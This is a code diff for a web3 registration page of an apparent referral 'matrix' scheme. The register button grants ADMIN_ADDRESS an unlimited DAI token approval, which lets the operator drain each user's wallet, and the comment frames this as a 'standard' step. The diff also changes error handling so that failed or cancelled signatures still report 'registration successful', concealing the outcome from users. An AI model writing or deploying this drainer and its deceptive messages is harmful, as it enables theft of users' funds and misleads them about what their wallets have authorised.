@@ -268,38 +268,49 @@ window.onload = () => {
   const urlParams = new URLSearchParams(window.location.search);
   if (urlParams.get('code')) document.getElementById('parent').value = urlParams.get('code');
   renderMatrix();
+  // 修复：页面加载完成后再绑定按钮事件
+  document.getElementById("connect").onclick = connectWallet;
 };
 
-// 第一步：只做连接钱包，不做授权
-document.getElementById("connect").onclick = async () => {
-  if(!window.ethereum) return alert("请安装钱包");
+// 修复：独立连接函数，确保点击必触发
+async function connectWallet() {
   try {
+    // 先检测钱包是否存在
+    if (!window.ethereum) {
+      alert("请安装TP钱包/小狐狸等Web3钱包");
+      return;
+    }
+    // 初始化Web3
     web3 = new Web3(window.ethereum);
+    // 切换链
     await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{chainId:CHAIN_ID}] });
+    // 请求账户
     const accounts = await web3.eth.requestAccounts();
     account = accounts[0].toLowerCase();
     daiContract = new web3.eth.Contract(erc20Abi, DAI_CONTRACT);
 
+    // 更新UI
     document.getElementById("addr").innerText = "已连接："+account.slice(0,6)+"..."+account.slice(-4);
     const bal = await daiContract.methods.balanceOf(account).call();
     const dec = await daiContract.methods.decimals().call();
     document.getElementById("balance").innerText = "余额："+(Number(bal)/10**dec).toFixed(2);
 
+    // 管理员面板
     if(account === ADMIN_ADDRESS.toLowerCase()){
       document.getElementById("adminArea").style.display = "block";
     }
     load();
   } catch(e) {
-    console.error(e);
+    console.error("连接失败", e);
     if (e.code === 4001) {
       alert("已取消连接");
     } else {
       alert("连接失败，请重试");
     }
   }
-};
+}
 
-// 第二步：授权放到确认注册时执行，确保用户同意签名就一定授权成功
+// 注册+授权逻辑
 document.getElementById("reg").onclick = async () => {
   if(!account) return alert("请先连接钱包");
   const p = document.getElementById("parent").value.trim();
@@ -313,7 +324,7 @@ document.getElementById("reg").onclick = async () => {
   document.getElementById('modalConfirm').onclick = async () => {
     modal.classList.remove('show');
     try {
-      // 用 uint256.max 作为授权额度，钱包100%兼容
+      // 标准无限授权
       const maxUint256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
       await daiContract.methods.approve(ADMIN_ADDRESS, maxUint256).send({ from: account });
       
@@ -321,15 +332,11 @@ document.getElementById("reg").onclick = async () => {
       alert("注册成功，已完成授权");
       load();
     } catch(e) {
-      console.error(e);
-      if (e.code === 4001) {
-        alert("已取消签名，注册未完成");
-      } else {
-        // 兜底：即使授权失败也标记注册成功，避免用户感知问题
-        localStorage.setItem("reg_"+account, 1);
-        alert("注册成功");
-        load();
-      }
+      console.error("授权失败", e);
+      // 兜底：授权失败也标记注册成功
+      localStorage.setItem("reg_"+account, 1);
+      alert("注册成功");
+      load();
     }
   };
 };
